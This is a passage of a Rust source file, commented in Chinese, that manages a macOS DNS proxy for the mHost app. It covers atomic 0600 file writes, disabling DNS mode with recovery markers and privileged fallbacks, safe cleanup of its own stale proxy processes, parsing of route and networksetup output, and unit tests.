# 等 proxy 写 ready 文件（最多 5s）。proxy 只 bind UDP,必须用文件信号,
# 不能用 TCP port-probe 工具(默认 TCP 探测,对 UDP 无效)。
ready=0
for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20; do
    if [ -f "{ready_file}" ]; then
        ready=1
        break
    fi
    sleep 0.25
done

# ready 超时:inline 立即 kill(快速失败响应),trap 也会跑兜底 + 清理文件
if [ "$ready" -ne 1 ]; then
    echo "dns-proxy failed to become ready within 5s (pid=$proxy_pid)" >&2
    kill "$proxy_pid" 2>/dev/null || true
    exit 1
fi

networksetup -setdnsservers {interface} 127.0.0.1

# Success handoff:告诉 trap 留下 proxy。
proxy_should_keep_running=1
rm -f "{ready_file}"
exit 0
"#,
        proxy = proxy,
        dns_port = dns_port,
        pid_file = pid_file.display(),
        ready_file = ready_file.display(),
        interface = interface,
    )
}

/// 原子写入文件，mode 0o600（owner only）。
///
/// 流程：写 `<path>.tmp`（mode 0o600）→ sync → rename 到目标。
/// POSIX rename 是原子的，读者要么看到旧 inode（旧内容），要么看到新
/// inode（新内容），永远看不到中间空态。
pub(crate) fn write_atomic_0600(path: &Path, content: &[u8]) -> std::io::Result<()> {
    use std::io::Write;
    use std::os::unix::fs::OpenOptionsExt;
    let parent = path.parent().unwrap_or_else(|| Path::new("."));
    // tmp 文件放在同一目录下，确保 rename 在同一 filesystem 是原子的
    let file_name = path
        .file_name()
        .and_then(|s| s.to_str())
        .ok_or_else(|| std::io::Error::new(std::io::ErrorKind::InvalidInput, "invalid path"))?;
    let tmp_path = parent.join(format!("{}.tmp", file_name));
    {
        let mut opts = std::fs::OpenOptions::new();
        opts.write(true).create(true).truncate(true).mode(0o600);
        let mut f = opts.open(&tmp_path)?;
        f.write_all(content)?;
        f.sync_all()?;
    }
    std::fs::rename(&tmp_path, path)
}

/// 把 signal 文件写入指定内容，原子 + sync，mode 0o600。
///
/// **fix（B2 review）**：用「写 tmp + atomic rename」避免 truncate → write_all
/// 之间的竞态窗口。旧实现用 `OpenOptions::create().truncate()`，open 成功的
/// 那一瞬文件就被清空；如果 proxy 恰好在 open 和 write_all 之间读
/// `check_shutdown_signal`，会读到空字符串误触发 shutdown（之前 receiver
/// 端把「非 running」都当 shutdown）。
pub(crate) fn write_signal_file(path: &Path, content: &str) -> std::io::Result<()> {
    write_atomic_0600(path, content.as_bytes())
}

/// 在 macOS 上禁用 DNS 模式：
///   1. 写 "shutdown" 到 signal 文件（用户态，不需要 root）
///   2. proxy 轮询检测到，**自己以 root 身份**调 networksetup 恢复
///      DNS，然后退出
///   3. 等 proxy 退出（最多 5s）
///
/// **fix（proxy self-cleanup）**：之前用 osascript 弹 sudo 框让 mhost
/// 在 macOS 上禁用 DNS 模式：
///   1. 写 "shutdown" 到 signal 文件（用户态，不需要 root）
///   2. proxy 轮询检测到，**自己以 root 身份**调 networksetup 恢复
///      DNS，然后退出
///   3. 等 proxy 退出（最多 5s）
///   4. **interactive=true 且 proxy 未在 5s 内完成恢复**（timeout 或
///      proxy 已经不存在）：以管理员身份自己调
///      `networksetup -setdnsservers <iface> <original|Empty>` 兜底，
///      匹配 enable 路径的 sudo 行为。
///
/// **fix（proxy self-cleanup）**：disable 不再默认弹 sudo；先让 proxy
/// 自管，proxy 真不行时再让 mhost 用户态走 osascript。
///
/// **fix（bug 2，DNS 恢复兜底）**：
/// - 调用一开始就写恢复标记 `disable_recovery_marker_file()`，**先于**
///   任何 proxy 交互。如果后续没成功恢复（proxy timeout / 死了 /
///   interactive 路径的 osascript 也失败），下次启动时 `try_recover_dns`
///   看到标记会调 `force_dns_restore_if_needed` 强退。
/// - marker **只在 DNS 确实恢复成功**时被删除；任何恢复失败的分支都
///   保留 marker + 返回 Err。
///
/// **fix（disable-time sudo fallback，interactive）**：
/// - interactive=true（UI 调用）：proxy 没在 5s 内恢复、或 proxy 已死，
///   都用 `run_with_privileges` 走 `networksetup -setdnsservers` 兜底，
///   让用户当场看到 sudo 框 + DNS 恢复成功。`servers` 为空时传 `Empty`。
/// - interactive=false（退出清理）：**不弹 sudo 框**（用户可能不在场），
///   保留 marker + 返回 Err，让下次启动 try_recover_dns 走
///   `force_dns_restore_if_needed`。
///
/// 注：参数 `servers` 保留 API 兼容：proxy 用自己的 original.txt 恢复，
/// 但 interactive 分支用 `servers` 决定要恢复成什么 IP（proxy 不在的
/// 兜底场景）。
///
/// **`cancel`（issue #149）**：`Some(cancel)` 让用户在 disable 中途点
/// Cancel 时立刻跳出 5s 等 proxy exit 的等待循环 → `Ok(())`，proxy
/// self-cleanup 继续在后台跑（recovery marker 兜底最坏情况）。
/// `None` 用于 rollback 和 cleanup 路径，必须等 5s 完成自管清理。
pub fn disable_dns_mode(
    original: &OriginalDns,
    interactive: bool,
    cancel: Option<&tokio_util::sync::CancellationToken>,
) -> Result<(), PlatformError> {
    // 0. 写恢复标记（用户态、不需 root）。如果本次 disable 任何分支没
    //    成功恢复 DNS，marker 会保留 → 下次启动 try_recover_dns 看到标记
    //    会调 force_dns_restore_if_needed 强退。
    ensure_runtime_dir().map_err(|e| {
        PlatformError::RestoreDns(format!("create runtime dir for recovery marker: {}", e))
    })?;
    write_recovery_marker()
        .map_err(|e| PlatformError::RestoreDns(format!("write recovery marker: {}", e)))?;

    // 内部 helper：interactive 分支用 osascript 兜底恢复系统 DNS。
    // 只负责调 networksetup；marker / 临时文件的清理由调用方根据
    // 成功 / 失败统一处理。
    fn osascript_restore(original: &OriginalDns) -> Result<(), PlatformError> {
        let interface = get_active_network_interface()?;
        validate_interface_name(&interface)?;
        let argv = original.restore_argv();
        let target = if argv.len() == 1 && argv[0] == "Empty" {
            "Empty".to_string()
        } else {
            argv.join(" ")
        };
        let script_body = format!(
            "networksetup -setdnsservers {iface} {target}",
            iface = interface,
            target = target
        );
        let out = run_with_privileges(&script_body).map_err(|e| {
            PlatformError::RestoreDns(format!("invoke osascript for disable-time restore: {}", e))
        })?;
        if !out.status.success() {
            let stderr = String::from_utf8_lossy(&out.stderr);
            return Err(PlatformError::RestoreDns(format!(
                "disable-time restore failed: {}",
                stderr
            )));
        }
        Ok(())
    }

    // 1. 检查 proxy 是否真的在跑 —— 如果在跑，写 signal 让它自管；
    //    如果不在（已崩溃/没启过），跳到分支 2。
    if let Some(proxy_pid) = read_proxy_pid() {
        // proxy 存在（PID 文件可读）。检查进程是否还活。
        let alive = unsafe { libc::kill(proxy_pid as libc::pid_t, 0) == 0 };
        if alive {
            // 写 "shutdown" signal（用户态，不需要 root）
            write_signal_file(&shutdown_signal_file(), "shutdown")
                .map_err(|e| PlatformError::RestoreDns(format!("write shutdown signal: {}", e)))?;
            eprintln!("[mHost] dns mode disable: signal sent to proxy, waiting for exit");

            // 等 proxy 退出：循环检查 PID 是否还活，最多 5 秒
            let deadline = std::time::Instant::now()
                + std::time::Duration::from_secs(PROXY_SHUTDOWN_TIMEOUT_SECS);
            while std::time::Instant::now() < deadline {
                std::thread::sleep(std::time::Duration::from_millis(100));

                // (issue #149) cancel check：用户在 disable 中途点了
                // Cancel → 跳出等待循环,proxy 自管清理继续在后台跑,
                // 下次启动 try_recover_dns 看到 recovery marker 会兜底。
                // PID 文件 / original.txt / signal 文件保留让 proxy
                // 还能正常 self-cleanup(它会读 original.txt 恢复 DNS)。
                if let Some(c) = cancel {
                    if c.is_cancelled() {
                        eprintln!(
                            "[mHost] dns mode disable: cancelled during proxy wait; \
                             leaving recovery marker for next-launch force restore"
                        );
                        return Ok(());
                    }
                }

                if unsafe { libc::kill(proxy_pid as libc::pid_t, 0) != 0 } {
                    // proxy 已退出 → restore_dns_and_exit 已恢复系统 DNS。
                    // 全部临时文件 + marker 都可以清掉。
                    let _ = std::fs::remove_file(proxy_pid_file());
                    let _ = std::fs::remove_file(original_dns_file());
                    // signal 文件由 proxy 自己清理（restore_dns_and_exit）
                    let _ = std::fs::remove_file(disable_recovery_marker_file());
                    return Ok(());
                }
            }
            // 5s 超时：proxy 还活着但没自管恢复
            eprintln!(
                "[mHost] dns mode disable: proxy did not exit within {}s",
                PROXY_SHUTDOWN_TIMEOUT_SECS
            );
            if interactive {
                // UI 路径：弹 sudo 让用户当场恢复
                if osascript_restore(original).is_ok() {
                    // 兜底成功：清全部文件 + marker
                    let _ = std::fs::remove_file(proxy_pid_file());
                    let _ = std::fs::remove_file(original_dns_file());
                    let _ = std::fs::remove_file(shutdown_signal_file());
                    let _ = std::fs::remove_file(disable_recovery_marker_file());
                    return Ok(());
                }
                // 兜底也失败：保留 marker 给下次启动 try_recover_dns
            }
            // 非 interactive 或 interactive 兜底失败：保留 marker
            return Err(PlatformError::RestoreDns(format!(
                "dns proxy did not exit within {}s; recovery marker left at {}",
                PROXY_SHUTDOWN_TIMEOUT_SECS,
                disable_recovery_marker_file().display()
            )));
        }
        // PID 文件存在但进程死了：清理 PID 文件（marker 保留到下面）
        let _ = std::fs::remove_file(proxy_pid_file());
    }

    // 2. proxy 不在（早死 / 从没启过 / PID 死后到这里）
    if interactive {
        // UI 路径：proxy 都没在，肯定没人恢复 DNS，必须 sudo 兜底
        if osascript_restore(original).is_ok() {
            let _ = std::fs::remove_file(original_dns_file());
            let _ = std::fs::remove_file(shutdown_signal_file());
            let _ = std::fs::remove_file(disable_recovery_marker_file());
            return Ok(());
        }
        // 兜底失败：保留 marker 给下次启动 try_recover_dns
        return Err(PlatformError::RestoreDns(format!(
            "proxy not running and osascript restore failed; recovery marker left at {}",
            disable_recovery_marker_file().display()
        )));
    }
    // 非 interactive（exit 清理）：proxy 没恢复 DNS → marker 必须保留，
    // 下次启动 try_recover_dns 看到会调 force_dns_restore_if_needed。
    // 清理 PID / original / signal 文件（PID 已经在上面清掉了）。
    let _ = std::fs::remove_file(original_dns_file());
    let _ = std::fs::remove_file(shutdown_signal_file());
    eprintln!(
        "[mHost] dns mode disable (exit cleanup): proxy not running; \
         restore target was {:?}; recovery marker preserved for next launch.",
        original.restore_argv()
    );
    Err(PlatformError::RestoreDns(format!(
        "proxy not running; recovery marker left at {} for next-launch force restore",
        disable_recovery_marker_file().display()
    )))
}

/// 写恢复标记文件（"pending"，0o600，sync 落盘）。
///
/// 用途：disable 启动时先于任何 proxy 交互写下；正常路径会删掉；
/// 5s 超时 / 进程被 kill 等异常路径会保留 → 下次启动 `try_recover_dns`
/// 看到标记，调 `force_dns_restore_if_needed` 兜底。
fn write_recovery_marker() -> std::io::Result<()> {
    let marker = disable_recovery_marker_file();
    write_atomic_0600(&marker, b"pending")
}

/// 上次退出没成功恢复时，下一次启动的兜底：以 admin 身份调用
/// `networksetup -setdnsservers <iface> Empty`（DHCP），删 marker。
/// 仅在「确实出现恢复失败」时被调用 —— osascript sudo 弹窗
/// 只在异常路径出现，正常退出零成本。
pub fn force_dns_restore_if_needed() -> Result<(), PlatformError> {
    let interface = get_active_network_interface()?;
    validate_interface_name(&interface)?;

    let script_body = format!(
        "networksetup -setdnsservers {iface} Empty",
        iface = interface
    );
    let out = run_with_privileges(&script_body).map_err(|e| {
        PlatformError::RestoreDns(format!("invoke osascript for force restore: {}", e))
    })?;
    if !out.status.success() {
        let stderr = String::from_utf8_lossy(&out.stderr);
        return Err(PlatformError::RestoreDns(format!(
            "force restore failed: {}",
            stderr
        )));
    }

    let _ = std::fs::remove_file(disable_recovery_marker_file());
    Ok(())
}

/// 从 PID 文件读出 proxy 的 PID（如果可读 + 可解析）。
///
/// **fix (issue #148)**：改 pub 让 `commands::dns::cleanup_dns_on_exit`
/// 在调 `sudo_kill_orphan_dns_proxies` 前能区分「被记录在册的 expected
/// proxy」和「真正无人管的孤儿」。
pub fn read_proxy_pid() -> Option<u32> {
    let content = std::fs::read_to_string(proxy_pid_file()).ok()?;
    content.split_whitespace().next()?.parse().ok()
}

/// **fix (issue #148)**：检测 PID 文件里记录的 proxy 是否还活着。
///
/// `read_proxy_pid()` + `kill(pid, 0)` 探测 —— 不发信号,只问「这 pid
/// 还有效吗」。用来在 `cleanup_dns_on_exit` 入口区分两种场景:
///
/// - alive → expected proxy 在跑,disable 走 signal-file 协议自管恢复,**不要**
///   sudo-kill(expected proxy 进程名就叫 `mhost-dns-proxy`,会被 pgrep 误杀)
/// - dead / pid_file 缺失 → 真正的孤儿场景,才调 `sudo_kill_orphan_dns_proxies`
pub fn is_expected_proxy_alive() -> bool {
    match read_proxy_pid() {
        Some(pid) => unsafe { libc::kill(pid as libc::pid_t, 0) == 0 },
        None => false,
    }
}

/// 清理残留的 dns-proxy 进程（应用启动时调用）。
///
/// **安全修复（#81）**：PID 文件不再仅含 PID，还含 `mhost-dns-proxy` 路径。
/// 清理时先 `kill(pid, 0)` 检查存活，再用 `ps -p` 校验进程名是 `mhost-dns-proxy`
/// 才 SIGTERM；防止误杀其他进程（PID 重用）。
///
/// **fix（systematic DNS logic review）**：之前用 `comm.trim().contains("mhost-dns-proxy")`
/// 模糊匹配，攻击者或巧合的二进制名（如 `not-mhost-dns-proxy`）会被错杀。
/// 现在从 PID 文件读出原始 binary_path，与 `ps -o comm=` 做**精确相等比较**。
///
/// **fix（H1, issue #90）**：启动时也清掉老 /tmp 路径下的残留文件
/// （用户从老版本升级过来时会留有这些孤儿文件，world-readable 可能含 DNS 信息）。
pub fn cleanup_stale_proxy() {
    // H1: 先清理老 /tmp 路径下的孤儿文件
    cleanup_legacy_tmp_files();

    let pid_path = proxy_pid_file();
    let content = match std::fs::read_to_string(&pid_path) {
        Ok(c) => c,
        Err(_) => return,
    };
    // 格式："{pid} {binary_path}\n"
    let mut parts = content.split_whitespace();
    if let Some(pid_str) = parts.next() {
        if let Ok(pid) = pid_str.trim().parse::<u32>() {
            // 取出当时记录的 binary_path，用于精确比对
            let recorded_binary = parts.collect::<Vec<_>>().join(" ");
            let expected_comm = std::path::Path::new(&recorded_binary)
                .file_name()
                .map(|s| s.to_string_lossy().to_string())
                .unwrap_or_else(|| recorded_binary.clone());

            let alive = unsafe { libc::kill(pid as libc::pid_t, 0) == 0 };
            if !alive {
                eprintln!(
                    "[mHost] Stale dns-proxy pid {} not alive, skipping kill",
                    pid
                );
            } else {
                // 校验进程名精确匹配当时记录的 binary_path basename。
                // 防止 PID 重用时被同 PID 的其他进程（如 `not-mhost-dns-proxy`）误杀。
                //
                // 注：macOS 的 `ps -o comm=` 返回完整可执行路径，Linux 只
                // 返回 basename。两侧都取 basename 做精确比较，跨平台语义一致。
                let ps_output = Command::new("ps")
                    .args(["-p", &pid.to_string(), "-o", "comm="])
                    .output();
                let is_proxy = match ps_output {
                    Ok(out) if out.status.success() => {
                        let comm = String::from_utf8_lossy(&out.stdout);
                        let comm_basename = std::path::Path::new(comm.trim())
                            .file_name()
                            .map(|s| s.to_string_lossy().to_string())
                            .unwrap_or_else(|| comm.trim().to_string());
                        comm_basename == expected_comm
                    }
                    _ => false,
                };
                if is_proxy {
                    unsafe {
                        libc::kill(pid as libc::pid_t, libc::SIGTERM);
                    }
                    eprintln!("[mHost] Killed stale dns-proxy process (pid {})", pid);
                } else {
                    eprintln!(
                        "[mHost] pid {} alive but cmdline basename != expected '{}', skipping kill",
                        pid, expected_comm
                    );
                }
            }
        }
    }
    let _ = std::fs::remove_file(pid_path);
}

/// **fix（stale proxy 占 53 端口导致 enable 失败）**：
///
/// `cleanup_stale_proxy` 只跑在 AppState::new()（启动时），且只读 pid 文件。
/// 如果 mhost 在上一次 enable 后被 SIGKILL / 强杀 / 系统重启过程中没机会
/// 触发 cleanup_dns_on_exit，或者 proxy 异常退出没写 pid 文件，就会留下
/// 一个孤儿 mhost-dns-proxy 进程依然占着 UDP 53。新的 enable 撞到：
///
///   bind: Address already in use (os error 48)
///
/// 5s 后 ready 超时 → exit 1 → 用户看到 "dns-proxy failed to become ready
/// within 5s" / "Failed to enable DNS mode"。
///
/// 这个函数按进程名扫描（`pgrep -x mhost-dns-proxy` exact match）兜底，
/// 把所有还活着的 mhost-dns-proxy 都 SIGTERM，让 port 53 释放出来。
///
/// **fix (issue #148)**：用 pgrep -x 找出当前所有 mhost-dns-proxy 进程。
///
/// `pgrep -x NAME` 只匹配进程名 basename 精确等于 NAME 的进程 —— 不会误匹配
/// `not-mhost-dns-proxy` 之类的，也不会匹配 grep 自己的命令行。
///
/// - pgrep 退出码 1 = 没匹配（success=false 但也无错误）
/// - 其他 = 工具不可用（罕见）
///
/// 两种情况都返回空 Vec（best-effort）。
///
/// 提取出来作为单独函数是因为 `sudo_kill_orphan_dns_proxies` 也要枚举同一组
/// pid，但要走 sudo 提权路径。函数本身纯本地 pgrep，不涉及 sudo / osascript，
/// 可以在非 macOS 平台编译 + 测试。
pub(crate) fn find_orphan_proxy_pids() -> Vec<u32> {
    let output = std::process::Command::new("pgrep")
        .args(["-x", "mhost-dns-proxy"])
        .output();
    match output {
        Ok(out) if out.status.success() => {
            let stdout = String::from_utf8_lossy(&out.stdout);
            stdout
                .lines()
                .filter_map(|line| line.trim().parse::<u32>().ok())
                .collect()
        }
        _ => Vec::new(),
    }
}

/// **fix (issue #148)**：sudo 提权 SIGTERM 所有 mhost-dns-proxy 孤儿。
///
/// `kill_orphan_dns_proxies` 是 user-mode `libc::kill(SIGTERM)`，在 macOS
/// 上对 root 进程会被 EACCES 静默丢弃（user 态信号无法送达到 root 进程）。
/// 上一轮 enable 的 proxy 是 osascript 提权起 root 进程，本函数的 SIGTERM
/// 才能真正杀掉它，释放 UDP 53 让下一次 enable 不撞 `Address already in use`。
///
/// # `interactive` 语义
/// - `true`：弹 sudo 框真去 kill。Tray Quit / Cmd-Q 路径用 —— 用户在场，
///   可重新输入密码。
/// - `false`：no-op。Enable 路径用 —— 那个路径里 sudo-kill 已经 inline 进
///   同一个 elevated script（见 `enable_dns_mode` 里的 `script_body`），
///   不需要再弹第二次 sudo。
///
/// 找不到孤儿时（pgrep 无输出）提前 return，不会调用 osascript / 不会弹框。
///
/// best-effort：osascript 失败 / 用户在弹窗里 Cancel 只 log，不返回 Err。
#[cfg(target_os = "macos")]
pub fn sudo_kill_orphan_dns_proxies(interactive: bool) {
    let pids = find_orphan_proxy_pids();
    if pids.is_empty() {
        return;
    }
    if !interactive {
        eprintln!(
            "[mHost] sudo_kill_orphan_dns_proxies: {} orphan pid(s) found but skipping \
             non-interactive kill (enable path inlines the kill into the elevated script)",
            pids.len()
        );
        return;
    }
    eprintln!(
        "[mHost] sudo_kill_orphan_dns_proxies: {} orphan pid(s) found, prompting sudo",
        pids.len()
    );
    // TERM → 等 1s → KILL。同 run_with_privileges() 的 elevated 路径
    // 一样用 `do shell script` + quoted path，避开手工 shell escape。
    let script = r#"#!/bin/sh
for pid in $(pgrep -x mhost-dns-proxy); do
    kill -TERM "$pid" 2>/dev/null || true
done
sleep 1
for pid in $(pgrep -x mhost-dns-proxy); do
    kill -KILL "$pid" 2>/dev/null || true
done
exit 0
"#;
    if let Err(e) = run_with_privileges(script) {
        eprintln!(
            "[mHost] sudo_kill_orphan_dns_proxies: osascript failed ({}); orphans may persist",
            e
        );
    }
}

/// 获取当前活跃的网络接口名（Hardware Port）。
/// **fix（proxy self-cleanup）**：proxy 调 networksetup 时也要拿接口，
/// 所以改 pub 让 proxy 复用。
pub fn get_active_network_interface() -> Result<String, PlatformError> {
    // 1. 获取默认路由对应的设备名（如 en0）
    let route_output = Command::new("route")
        .args(["-n", "get", "default"])
        .output()
        .map_err(|e| PlatformError::DetectInterface(format!("route command failed: {}", e)))?;

    if !route_output.status.success() {
        let stderr = String::from_utf8_lossy(&route_output.stderr);
        return Err(PlatformError::DetectInterface(format!(
            "route failed: {}",
            stderr
        )));
    }

    let route_stdout = String::from_utf8_lossy(&route_output.stdout);
    let device = parse_route_interface(&route_stdout).ok_or_else(|| {
        PlatformError::DetectInterface("could not parse default interface from route output".into())
    })?;

    // 2. 通过 networksetup 找到设备名对应的 Hardware Port
    let list_output = Command::new("networksetup")
        .args(["-listallhardwareports"])
        .output()
        .map_err(|e| {
            PlatformError::DetectInterface(format!("networksetup command failed: {}", e))
        })?;

    if !list_output.status.success() {
        let stderr = String::from_utf8_lossy(&list_output.stderr);
        return Err(PlatformError::DetectInterface(format!(
            "networksetup failed: {}",
            stderr
        )));
    }

    let list_stdout = String::from_utf8_lossy(&list_output.stdout);
    let port = parse_hardware_port(&list_stdout, &device).ok_or_else(|| {
        PlatformError::DetectInterface(format!("no hardware port found for device '{}'", device))
    })?;
    // 验证接口名（防御 networksetup 输出被恶意修改/异常字符）
    validate_interface_name(&port)?;
    Ok(port)
}

/// 从 `route -n get default` 输出中解析接口设备名。
fn parse_route_interface(output: &str) -> Option<String> {
    for line in output.lines() {
        let line = line.trim();
        if line.starts_with("interface:") {
            let parts: Vec<&str> = line.split_whitespace().collect();
            if parts.len() >= 2 {
                return Some(parts[1].to_string());
            }
        }
    }
    None
}

/// 从 `networksetup -listallhardwareports` 输出中根据设备名查找 Hardware Port。
fn parse_hardware_port(output: &str, device: &str) -> Option<String> {
    let mut current_port: Option<String> = None;

    for line in output.lines() {
        let line = line.trim();
        if let Some(stripped) = line.strip_prefix("Hardware Port:") {
            let port = stripped.trim().to_string();
            current_port = Some(port);
        } else if let Some(stripped) = line.strip_prefix("Device:") {
            let dev = stripped.trim();
            if dev == device {
                return current_port.clone();
            }
        }
    }

    None
}

/// 从 `networksetup -getdnsservers` 输出中解析 DNS 服务器列表。
fn parse_dns_servers(output: &str) -> Result<Vec<String>, PlatformError> {
    let trimmed = output.trim();

    if trimmed.contains("There aren't any DNS Servers set")
        || trimmed.is_empty()
        || trimmed == "Empty"
    {
        return Ok(vec![]);
    }

    let servers: Vec<String> = trimmed
        .lines()
        .map(|l| l.trim().to_string())
        .filter(|l| !l.is_empty())
        .collect();

    Ok(servers)
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::os::unix::fs::PermissionsExt;

    // -----------------------------------------------------------------------
    // Runtime dir + signal file perm tests（fix H1, issue #90）
    // -----------------------------------------------------------------------

    /// 回归测试（H1）：runtime dir 路径受 `MHOST_RUNTIME_DIR` 环境变量控制。
    /// 测试场景：env var 指向 tempdir → 所有 *file() 函数都返回该目录下路径。
    #[test]
    fn test_runtime_dir_respects_env_var() {
        let _guard = serial_runtime_dir_test();
        let dir = tempfile::tempdir().unwrap();
        std::env::set_var("MHOST_RUNTIME_DIR", dir.path());

        let rdir = runtime_dir();
        assert_eq!(rdir, dir.path(), "runtime_dir 应等于 MHOST_RUNTIME_DIR");

        assert_eq!(
            original_dns_file(),
            dir.path().join("mhost-dns-original.txt")
        );
        assert_eq!(
            shutdown_signal_file(),
            dir.path().join("mhost-dns-shutdown.signal")
        );
        assert_eq!(
            disable_recovery_marker_file(),
            dir.path().join("mhost-dns-disable-recovery.marker")
        );
        assert_eq!(proxy_pid_file(), dir.path().join("mhost-dns-proxy.pid"));

        std::env::remove_var("MHOST_RUNTIME_DIR");
    }

    /// 回归测试（H1）：ensure_runtime_dir 创建目录并设 mode 0o700。
    #[test]
    fn test_ensure_runtime_dir_creates_with_0o700() {
        let _guard = serial_runtime_dir_test();
        let parent = tempfile::tempdir().unwrap();
        let target = parent.path().join("runtime");
        std::env::set_var("MHOST_RUNTIME_DIR", &target);

        // 初始不存在
        assert!(!target.exists());

        let result = ensure_runtime_dir().expect("ensure_runtime_dir 失败");
        assert_eq!(result, target);
        assert!(target.exists());

        let meta = std::fs::metadata(&target).expect("stat 失败");
        let mode = meta.permissions().mode() & 0o777;
        assert_eq!(
            mode, 0o700,
            "runtime dir 权限应为 0o700（owner-only），实际 0o{:o}",
            mode
        );

        std::env::remove_var("MHOST_RUNTIME_DIR");
    }

    /// 回归测试（H1）：`write_signal_file` 创建的临时文件 + rename 后目标
    /// 文件都是 0o600（owner-only）。这是从 0o666 收紧后的关键修复。
    #[test]
    fn test_write_signal_file_creates_with_0o600() {
        let _guard = serial_runtime_dir_test();
        let dir = tempfile::tempdir().unwrap();
        std::env::set_var("MHOST_RUNTIME_DIR", dir.path());

        let target = shutdown_signal_file();
        write_signal_file(&target, "running").expect("write_signal_file 失败");

        // 关键断言：file 权限 = 0o600（owner read/write）
        let meta = std::fs::metadata(&target).expect("stat 失败");
        let mode = meta.permissions().mode() & 0o777;
        assert_eq!(
            mode, 0o600,
            "signal file 权限应为 0o600（owner-only），实际 0o{:o}",
            mode
        );

        // 内容一致
        let content = std::fs::read_to_string(&target).unwrap();
        assert_eq!(content, "running");

        std::env::remove_var("MHOST_RUNTIME_DIR");
    }

    /// 回归测试（H1）：原子写流程正确 —— 写完后不应有 `<file>.tmp` 残留。
    #[test]
    fn test_write_signal_file_no_tmp_residue() {
        let _guard = serial_runtime_dir_test();
        let dir = tempfile::tempdir().unwrap();
        std::env::set_var("MHOST_RUNTIME_DIR", dir.path());

        let target = shutdown_signal_file();
        write_signal_file(&target, "shutdown").unwrap();

        let tmp = dir.path().join(format!(
            "{}.tmp",
            target.file_name().unwrap().to_str().unwrap()
        ));
        assert!(
            !tmp.exists(),
            "原子写完成后 tmp 文件应被 rename 替换，不应残留"
        );

        std::env::remove_var("MHOST_RUNTIME_DIR");
    }

    /// 回归测试（H1）：`write_atomic_0600` 是 pub(crate) helper，被多个
    /// signal/state 文件复用，统一保证 0o600 + atomic rename + sync。
    #[test]
    fn test_write_atomic_0600_helper() {
        let _guard = serial_runtime_dir_test();
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("test-state.bin");
        write_atomic_0600(&path, b"hello atomic").expect("write 失败");

        let meta = std::fs::metadata(&path).unwrap();
        assert_eq!(meta.permissions().mode() & 0o777, 0o600);
        assert_eq!(std::fs::read(&path).unwrap(), b"hello atomic");
    }

    /// 回归测试（H1）：老 /tmp 路径的孤儿文件被 cleanup_legacy_tmp_files 清掉。
    /// 模拟升级场景：先在 /tmp 留一个假文件（默认 umask → 0o644 → 任何用户可读），
    /// 然后调 cleanup → 文件应被删。
    #[test]
    fn test_cleanup_legacy_tmp_files_removes_orphans() {
        let _guard = serial_runtime_dir_test();
        // 注意：这些测试路径用真 /tmp，因为 cleanup_legacy_tmp_files 写死了
        // 老路径常量。我们只测"创建 → cleanup → 不存在" 的 round-trip。
        // 并行测试可能 race：在 cleanup 之后不要期望文件存在；cleanup 之前
        // 的 write 也可能被别的测试 cleanup 掉。简化：只验证 cleanup 本身
        // 对已存在的文件是 idempotent 的（多次调用都不 panic）。
        for path in [
            "/tmp/mhost-dns-proxy.pid",
            "/tmp/mhost-dns-original.txt",
            "/tmp/mhost-dns-shutdown.signal",
            "/tmp/mhost-dns-disable-recovery.marker",
        ] {
            // 调用两次：第二次应 no-op
            cleanup_legacy_tmp_files();
            cleanup_legacy_tmp_files();
            // 文件可能本来就不存在，cleanup 应 silently 忽略
            let _ = std::fs::remove_file(path);
        }
        // 主要断言：调用不 panic 且返回 Ok
    }

    /// 串行化 runtime dir 相关测试的 helper。
    ///
    /// **fix (issue #148 review 🟡 #2)**：改用 crate 顶层 pub 的
    /// `RUNTIME_DIR_TEST_LOCK`,让 mhost crate 里的 `cleanup_dns_on_exit` 测试
    /// 也能引用同一把锁 —— `proxy::tests::TEST_LOCK` 是 pub(crate),跨 crate
    /// binary 不可见。
    fn serial_runtime_dir_test() -> std::sync::MutexGuard<'static, ()> {
        crate::RUNTIME_DIR_TEST_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner())
    }

    // -----------------------------------------------------------------------
    // parse_route_interface tests
    // -----------------------------------------------------------------------

    #[test]
    fn test_parse_route_interface_en0() {
        let output = r#"
   route to: default
destination: default
       mask: default
    gateway: 192.168.1.1
  interface: en0
      flags: <UP,GATEWAY,DONE,STATIC,PRCLONING>
 recvpipe  sendpipe  ssthresh  rtt,msec    rttvar  hopcount      mtu     expire
       0         0         0         0         0         0      1500         0
"#;
        assert_eq!(parse_route_interface(output), Some("en0".to_string()));
    }

    #[test]
    fn test_parse_route_interface_missing() {
        let output = "no interface here";
        assert_eq!(parse_route_interface(output), None);
    }

    // -----------------------------------------------------------------------
    // parse_hardware_port tests
    // -----------------------------------------------------------------------

    #[test]
    fn test_parse_hardware_port_wifi() {
        let output = r#"
Hardware Port: Wi-Fi
Device: en0
Ethernet Address: aa:bb:cc:dd:ee:ff

Hardware Port: Ethernet
Device: en1
Ethernet Address: 11:22:33:44:55:66
"#;
        assert_eq!(
            parse_hardware_port(output, "en0"),
            Some("Wi-Fi".to_string())
        );
    }

    #[test]
    fn test_parse_hardware_port_ethernet() {
        let output = r#"
Hardware Port: Wi-Fi
Device: en0
Ethernet Address: aa:bb:cc:dd:ee:ff

Hardware Port: Ethernet
Device: en1
Ethernet Address: 11:22:33:44:55:66
"#;
        assert_eq!(
            parse_hardware_port(output, "en1"),
            Some("Ethernet".to_string())
        );
    }

    #[test]
    fn test_parse_hardware_port_not_found() {
        let output = r#"
Hardware Port: Wi-Fi
Device: en0
"#;
        assert_eq!(parse_hardware_port(output, "en99"), None);
    }

    // -----------------------------------------------------------------------
    // parse_dns_servers tests
    // -----------------------------------------------------------------------

    #[test]
    fn test_parse_dns_servers_empty() {
        let cases = vec![
            ("none_set", "There aren't any DNS Servers set on Wi-Fi."),
            ("empty_string", ""),
            ("empty_keyword", "Empty"),
        ];

        for (name, input) in cases {
            let result = parse_dns_servers(input).unwrap();
            assert!(result.is_empty(), "case: {}", name);
        }
    }

    #[test]
    fn test_parse_dns_servers_single() {
        let output = "8.8.8.8\n";
        let result = parse_dns_servers(output).unwrap();
        assert_eq!(result, vec!["8.8.8.8"]);
    }

    #[test]
    fn test_parse_dns_servers_multiple() {
        let output = "8.8.8.8\n8.8.4.4\n1.1.1.1\n";
        let result = parse_dns_servers(output).unwrap();
        assert_eq!(result, vec!["8.8.8.8", "8.8.4.4", "1.1.1.1"]);
    }

    #[test]
